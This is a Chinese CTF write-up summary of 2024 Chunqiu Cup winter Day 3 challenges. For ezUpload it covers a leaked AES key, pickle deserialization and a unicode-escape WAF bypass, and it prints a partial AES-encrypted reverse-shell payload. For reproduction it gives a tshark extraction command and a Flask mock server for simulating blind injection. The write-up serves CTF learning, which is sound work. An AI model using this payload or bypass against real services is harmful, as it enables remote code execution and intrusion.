---
title: 春秋杯WP | 2024春秋杯冬季赛第三天题目部分解析
contest: 春秋杯2024冬季赛
year: 2024
difficulty: medium
vuln_type: web_unknown
tags: [AES-ECB, pickle反序列化, WAF绕过, 流量分析, 盲注模拟, Flask服务端, Python沙箱]
attack_chain: ezUpload:AES-ECB加密pickle payload+unicode\u0062绕WAF→TXT上传解密触发反序列化反弹shell→reproduction:tshark提取http请求+Flask模拟服务端→client.exe盲注测试
key_payload: "AES.new(key=b'UpLOad_encr7Pt3d', MODE_ECB);pickle unicode escape \u0062\u0069 etc;pickle V__builtin__ exec;tshark -Y http -T fields;Flask模拟"
one_liner: 春秋杯2024冬季赛D3多题：ezUpload pickle+AES-ECB+unicode绕WAF+reproduction流量盲注模拟
lesson: pickle WAF绕过用unicode转义(\u0062\u0069)替代敏感字符，AES+反序列化组合利用
quality: medium
---

# 春秋杯WP | 2024春秋杯冬季赛第三天题目部分解析

**赛事**：春秋杯2024冬季赛 Day 3

**关键题目解析**：

**1. ezUpload（文件加解密 + pickle反序列化）**
- 上传TXT文件触发AES加密
- 扫描路由发现 `/hint` → base64解密得密钥 `UpLOad_encr7Pt3d`
- 解密时存在 **pickle反序列化**
- WAF过滤：`R/i/b/o/curl/flag/system/空格`
- 绕过：使用 **unicode转义** `__\u0062uiltin__` 等替代敏感字符
- 反弹shell payload（AES-ECB加密后上传）：
  ```python
  key = b'UpLOad_encr7Pt3d'
  cipher = AES.new(key, AES.MODE_ECB)
  payload = b'V__u0062uu0069ltu0069n__\nVmap\nx93p0\n0(]Vu0069mpu006Frtu0020su006Fcket,suu0062pru006Fcess,u006Fs;s=su006Fcket.su006Fcket(...);\n...'
  ```

**2. reproduction（流量盲注模拟）**
- exe加壳无法分析盲注逻辑
- tshark提取http请求：`tshark -r testflag.pcapng -Y "http" -T fields -e urlencoded-form.value -e http.response.code`
- 请求包含 position + hash 字段
- 响应 200/500/400 三种
- **构造Flask模拟服务端**接收position/hash请求
- 跑client.exe对模拟服务端测试
- 200响应码后position+1 → 类似SQL盲注

**3. EzMisc / dance / easyvm / toys / 和谐 / rogue_like / FlagBot / backdoor**：
- 在本WP中部分涉及，详情略

**技术总结**：
- pickle反序列化 + AES加密组合绕过WAF
- unicode转义作为关键字绕过（`__builtin__` → `__\u0062uiltin__`）
- 流量盲注通过模拟客户端/服务端还原逻辑

**质量评估**：中（核心两题payload完整，其他题简略）
